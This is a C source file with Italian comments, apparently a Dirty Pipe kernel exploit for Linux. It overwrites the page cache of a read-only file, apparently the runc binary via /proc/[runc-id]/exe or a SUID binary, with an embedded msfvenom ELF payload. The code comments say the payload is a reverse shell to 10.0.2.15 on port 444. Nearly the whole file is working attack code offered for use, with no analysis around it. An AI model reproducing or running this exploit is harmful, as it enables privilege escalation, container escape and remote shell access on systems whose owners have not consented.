/*
*
*codice per Linux
*
*
*/


#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE getpagesize() 
#endif


//generato con msfvenom. reverse shell all'indirizzo 10.0.2.15 444
unsigned char elfcode[] = {
        /*0x7f,*/ 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x04, 0x08,
        0x00, 0x80, 0x04, 0x08, 0xb3, 0x00, 0x00, 0x00, 0x12, 0x01, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
        0x00, 0x10, 0x00, 0x00, 0xda, 0xde, 0xd9, 0x74, 0x24, 0xf4, 0x58, 0xbd, 0x5b, 0xfd, 0x78, 0xae,
        0x2b, 0xc9, 0xb1, 0x12, 0x31, 0x68, 0x17, 0x83, 0xe8, 0xfc, 0x03, 0x33, 0xee, 0x9a, 0x5b, 0xf2,
        0xcb, 0xac, 0x47, 0xa7, 0xa8, 0x01, 0xe2, 0x45, 0xa6, 0x47, 0x42, 0x2f, 0x75, 0x07, 0x30, 0xf6,
        0x35, 0x37, 0xfa, 0x88, 0x7f, 0x31, 0xfd, 0xe0, 0x75, 0xc1, 0xff, 0xff, 0xe1, 0xc3, 0xff, 0xfe,
        0x4d, 0x4a, 0x1e, 0xb0, 0xc8, 0x1d, 0xb0, 0xe3, 0xa7, 0x9d, 0xbb, 0xe2, 0x05, 0x21, 0xe9, 0x8c,
        0xfb, 0x0d, 0x7d, 0x24, 0x6c, 0x7d, 0xae, 0xd6, 0x05, 0x08, 0x53, 0x44, 0x85, 0x83, 0x75, 0xd8,
        0x22, 0x59, 0xf5, 0x00 };


#define ELFCODE_SIZE sizeof(elfcode)


	

void prepara_pipe(int p[2] ){

	uint8_t buffer[PAGE_SIZE]; //4096 Byte (4KB)
	const unsigned pipe_size=fcntl(p[1],F_GETPIPE_SZ); //tipicamente 16 pagine circa. Varia da architettura a architettura
	
	//riempi pipe completamente
	for(int to_write=pipe_size; to_write > 0; to_write-=PAGE_SIZE){

		if(  to_write >= PAGE_SIZE ){
			write(p[1], buffer, PAGE_SIZE);		
		}else{
			write(p[1], buffer, to_write );
		}
	}

	//svuota pipe completamente
	for(int to_read=pipe_size; to_read > 0; to_read-=PAGE_SIZE){

		if(  to_read >= PAGE_SIZE ){
			read(p[0], buffer, PAGE_SIZE);		
		}else{
			read(p[0], buffer, to_read );
		}
	}

}


void punta_page_cache(int fd, int p[2]){


	loff_t offset=0;
	int res = splice(fd,&offset,p[1],NULL,1,0); 
	if( res <= 0 ){
		perror(res < 0? "[x] splice non riuscita \n" :  "[x] splice troppo corta \n");
		exit(EXIT_FAILURE);
	}
}

void scrivi_page_cache(int p[2], uint8_t * data){

	ssize_t numwrite;
	
	numwrite = write(p[1],data,ELFCODE_SIZE);
	if(numwrite < ELFCODE_SIZE){
		perror( numwrite == 0 ? "[x] write non riuscita \n" : "[x] write troppo corta \n");
		exit(EXIT_FAILURE);
	}
}



void dirty_pipe(int p[2], char * path, uint8_t * data){

	int fd;
	
	
	if (pipe(p) == -1){
		perror("[x] Problema nella creazione della pipe \n");
		exit(EXIT_FAILURE);
	}

	if (( fd = open( path, O_RDONLY ) ) < 0 ){
		fprintf(stderr,"[x] Errore nell'apertura file: %s \n",path);
		exit(EXIT_FAILURE);
	}


	prepara_pipe(p);
	punta_page_cache(fd,p);
	scrivi_page_cache(p,data);

	close(fd);

}



void main(int argc, char **argv){

	int p[2];
	char *path = argv[1]; //argomento: /proc/[runc-id]/exe

	if( ELFCODE_SIZE > PAGE_SIZE-2 ){
		fprintf(stderr,"[x] Payload troppo grande (%d Byte. Massimo consentito: %d Byte)\n",ELFCODE_SIZE,PAGE_SIZE-2);
		exit(EXIT_FAILURE);
	}

	if(path == NULL){
		perror("Specificare la binary. Uso: ./eseguibile percorso_SUID_BINARY\n");
		exit(EXIT_FAILURE);
	}


	dirty_pipe(p,path,elfcode);
	printf("[v] codice iniettato \n");

	
	
	
	exit(EXIT_SUCCESS);
}



